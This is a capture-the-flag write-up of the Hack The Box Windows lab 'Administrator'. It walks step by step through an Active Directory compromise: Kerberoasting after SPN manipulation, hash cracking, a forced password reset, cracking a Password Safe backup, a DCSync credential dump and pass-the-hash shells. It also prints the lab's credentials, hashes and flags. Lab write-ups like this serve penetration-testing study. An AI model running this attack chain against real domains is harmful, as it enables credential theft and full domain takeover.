# 🧑‍💻 Hack The Box – Administrator

## 📌 Overview
- **Machine Name:** Administrator
- **IP Address(es):** 10.10.11.42
- **Difficulty:** Medium
- **OS:** Windows
- **Tags:** SMB / Active Directory / Kerberoasting / Password Safe / DCSync
- **Date Completed:** 2025.08.30
- **Status:** ✅ User | ✅ Root

---

## 🖥️ Initial Recon
### Nmap
```zsh
nmap -sC -sV -oA nmap/administrator 10.10.11.42
```

```
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows AD Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Findings:**

* Standard AD services exposed (Kerberos, LDAP, SMB, WinRM).
* FTP service available for further testing.

---

## 📂 SMB & LDAP Enumeration

### Known Credentials

```
User: Olivia
Pass: ichliebedich
```

### SMB Shares
```zsh
nxc smb administrator.htb -u 'Olivia' -p 'ichliebedich' --shares
```

```
IPC$, NETLOGON, SYSVOL → READ
```

* No immediately sensitive files located.

---

## 🧭 BloodHound (Phase 1)

Collected data:

```zsh
rusthound-ce -d administrator.htb -u 'Olivia' -p 'ichliebedich' -o bloodhound --ldap-filter='(objectGuid=*)' -c All
```

**Finding:** Olivia has **GenericAll** over user `michael`.

---

## 🔑 Exploitation – Michael

1. Add SPN to `michael`:

```zsh
bloodyAD -d administrator.htb --host DC.administrator.htb -u 'Olivia' -p 'ichliebedich' set object 'michael' servicePrincipalName -v 'http/test'
```

2. Roast the ticket:

```zsh
nxc ldap DC.administrator.htb -d administrator.htb -u 'Olivia' -p 'ichliebedich' --kerberoasting michael
```

3. Crack:

```zsh
hashcat michaelkrb.hash rockyou.txt
```

* Password recovered: `kali123`

---

## 🧭 BloodHound (Phase 2)

* Michael → has **ForceChangePassword** on `benjamin`.

### Exploit

```zsh
bloodyAD -d administrator.htb -u 'michael' -p 'kali123' --host DC.administrator.htb set password benjamin Test1234.
```

---

## 📂 FTP Loot – Benjamin

Access FTP:

```zsh
ftp 'ftp://benjamin:Test1234.@10.10.11.42'
```

Downloaded: `Backup.psafe3`

### Cracking Safe

```zsh
pwsafe2john Backup.psafe3 > pwsafe.hash
john pwsafe.hash -w rockyou.txt
```

Password: `tekieromucho`

**Extracted credentials:**
- alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
- emily     : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
- emma      : WwANQWnmJnGV07WQN8bMS7FMAbjNur

---

## 🔑 Exploitation – Emily

```zsh
evil-winrm -i administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

```
*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
629866b1f254acd3a8cb232669a022f2
```

* **Result:** User shell obtained.

---

## 🧭 BloodHound (Phase 3)

* Emily → has **GenericWrite** on `ethan`.

### Exploit

```zsh
bloodyAD -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --host DC.administrator.htb set object 'ethan' servicePrincipalName -v 'http/whatever'
nxc ldap DC.administrator.htb -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoasting ethan
hashcat ethan.hash rockyou.txt
```

* Password recovered: `limpbizkit`

---

## 🧭 BloodHound (Phase 4)

* Ethan → has **DCSync** rights.

### Exploit

```zsh
impacket-secretsdump 'administrator.htb/ethan:limpbizkit@DC.administrator.htb'
```

Extracted Administrator hash:

```
Administrator : 3dc553ce4b9fd20bd016e098d2d2fd2e
```

### Shell

```zsh
evil-winrm -i administrator.htb -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a1685e5c6f5672a76b1395476440dc43
```

* **Result:** Full domain compromise.

---

## 🏁 Flags

* **User.txt:** `629866b1f254acd3a8cb232669a022f2`
* **Root.txt:** `a1685e5c6f5672a76b1395476440dc43`

---

## 🧠 Lessons Learned

* **Technical:**

  * GenericAll and GenericWrite can be leveraged for Kerberoasting and SPN abuse.
  * Backup files may contain critical credentials.
  * DCSync is the most direct route to Domain Admin.

* **Personal:**

  * Always test credentials across multiple services (FTP, SMB, WinRM).
  * When BloodHound results seem incomplete, rerun with alternative collectors.
  * Password vaults should be assumed sensitive and cracked if possible.

* **Reusable Techniques:**

  * SPN manipulation → Kerberoasting → password cracking.
  * ForceChangePassword for lateral movement.
  * DCSync to dump domain secrets and escalate to Administrator.
